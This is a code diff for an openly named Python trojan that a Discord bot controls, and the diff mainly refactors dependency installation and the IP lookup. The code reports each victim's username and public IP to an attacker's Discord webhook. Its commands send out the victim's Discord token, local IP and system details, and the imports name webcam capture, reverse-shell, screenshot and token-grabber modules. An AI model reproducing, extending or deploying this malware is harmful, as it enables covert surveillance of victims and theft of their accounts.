@@ -1,70 +1,26 @@
-from trojan_functions import cam, rv, token_grabber, screen_shot, encrypt_decrypt
+from trojan_functions import cam, rv, token_grabber, screen_shot, encrypt_decrypt, check_requirements
 import os, subprocess, getpass, datetime, platform, shutil, socket, time, random, webbrowser, signal
 try:
     import requests
     from discord_webhook import DiscordWebhook
     import cv2
-    import discord, random, string
+    import discord
     from discord.ext import commands
-    from discord import DMChannel
     import pytube
     import pyautogui
 except ModuleNotFoundError:
-    r = os.system("pip3 install discord_webhook")
-    if(r == 1):
-        r = os.system("pip install discord_webhook")
-        if(r == 1):
-            from urllib import request
-            if(platform.system == "Windows"):
-                remote_url = 'https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe'
-                local_file = '''%appdata%\\python-3.11.1-amd64.exe'''
-                request.urlretrieve(remote_url, local_file)
-                process = subprocess.Popen(local_file, shell=True, stdin=subprocess.PIPE)
-                path = os.path.join(location="%appdata%", file="python-3.11.1-amd64.exe")
-                os.remove(path)
-                print("please, restart the program...")
-                exit()
-            elif (platform.system == "Linux"):
-                s = os.system("sudo apt install python3 -y")
-                if(s == 1):
-                    s = os.system("sudo pacman -S python3 -y")
-                    if(s == 1):
-                        os.system("sudo yum install python3 -y")
-                        exit()
-                    else:
-                        exit()
-                else:
-                    exit()
-        else:
-            os.system("pip install requests")
-            os.system("pip install discord")
-            os.system("pip install opencv-python")
-            os.system("pip install pytube")
-            os.system("pip install pyautogui")
-    else:
-        os.system("pip3 install requests")
-        os.system("pip3 install discord")
-        os.system("pip3 install opencv-python")
-        os.system("pip3 install pytube")
-        os.system("pip3 install pyautogui")
-    if(platform.system() == "Linux"):
-        l = os.system("sudo apt-get install scrot -y")
-        if(l == 1):
-            r = os.system("sudo pacman -S scrot -y")
-            if(r == 1):
-                os.system("sudo yum install scrot -y")
-    os.system("cls||clear")
-    print("restart the script")
+    check_requirements.check()
     exit()
 
 #url
 
+public_ip = "https://checkip.amazonaws.com"
 Webhook_url = "Webhook Url Here"
 discord_bot_token = 'discord bot token here'
 
 #end url
 
-webhook = DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è connsesso"))
+webhook = DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get(public_ip).text + "si è connsesso"))
 response = webhook.execute()
 
 client = commands.Bot(command_prefix='?', description="", intents=discord.Intents.all())
@@ -76,19 +32,19 @@ async def on_ready():
 @client.command()
 @commands.has_permissions(administrator=True)
 async def ip(ctx):
-    await ctx.send(requests.get("https://checkip.amazonaws.com").text)
+    await ctx.send(requests.get(public_ip).text)
 
 @client.command()
 @commands.has_permissions(administrator=True)
 async def username(ctx):
-    await ctx.send(getpass.getuser() + " -> " + requests.get("https://checkip.amazonaws.com").text)
+    await ctx.send(getpass.getuser() + " -> " + requests.get(public_ip).text)
 
 @client.command()
 async def info(ctx):
     try:
-        await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get("https://checkip.amazonaws.com").text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())) + "\nDiscord Token: " + token_grabber.tok_grab() +"\n--------------------")
+        await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get(public_ip).text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())) + "\nDiscord Token: " + token_grabber.tok_grab() +"\n--------------------")
     except:
-        await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get("https://checkip.amazonaws.com").text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())))
+        await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get(public_ip).text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())))
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -227,7 +183,7 @@ async def power_off(ctx):
 @client.command()
 @commands.has_permissions(administrator=True)
 async def disconnect(ctx):
-    DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
+    DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get(public_ip).text + "si è disconnsesso")).execute()
     exit()
 
 @client.command()
@@ -368,6 +324,6 @@ async def commands(ctx):
 
 client.run(discord_bot_token)
 
-DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
+DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get(public_ip).text + "si è disconnsesso")).execute()
 
 os.system("cls||clear")
